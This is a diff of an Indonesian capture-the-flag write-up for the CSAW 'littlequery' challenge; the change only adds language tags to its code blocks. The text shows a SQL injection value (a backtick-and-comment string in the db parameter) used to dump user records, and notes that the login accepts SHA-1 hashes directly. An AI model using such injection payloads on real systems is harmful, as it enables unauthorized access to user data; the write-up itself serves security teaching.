@@ -31,12 +31,14 @@ http://littlequery.chal.csaw.io
 Di source code pada halaman index kita bisa menemukan ada source yang di comment
 
 ```
-            <!--
-            <div class="col-md-4">
-                <h2>For Developers</h2>
-                <p>Check out our <a href="/api/db_explore.php">API</a></p>
-            </div>
-            -->
+html
+
+<!--
+<div class="col-md-4">
+    <h2>For Developers</h2>
+    <p>Check out our <a href="/api/db_explore.php">API</a></p>
+</div>
+-->
 ```
 
 
@@ -61,6 +63,8 @@ kemudian untuk melakukan list kolom pada table user gunakan `http://littlequery.
 dan di dapatkan
 
 ```
+json
+
 {
     columns: {
         uid: "int(11)",
@@ -79,6 +83,8 @@ tidak match dengan == "littlequery" kita bisa menggunakan # sebagai comment
 illustrasi kodingan yang digunakan adalah sebagai berikut
 
 ```
+php
+
 $db = addslashes($_GET['db']);
 $table = addslashes($_GET['table']);
 
@@ -103,6 +109,8 @@ $db = "littlequery`.`user`#" // jadi kita gak kena deny lagi
 didapatkan user dan password yang di hash 
 
 ```
+json
+
 [
     {
         uid: "1",
@@ -116,6 +124,8 @@ kita tidak harus mencari plain-text dari SHA-1 tersebut karena website tersebut 
 hashed password bukan dengan plaintext password diketahui dari script yang ada di login.js
 
 ```
+javascript
+
 $(".form-signin").submit(function () {
     var $password = $(this).find("input[type=password]");
     $password.val(CryptoJS.SHA1($password.val()).toString());
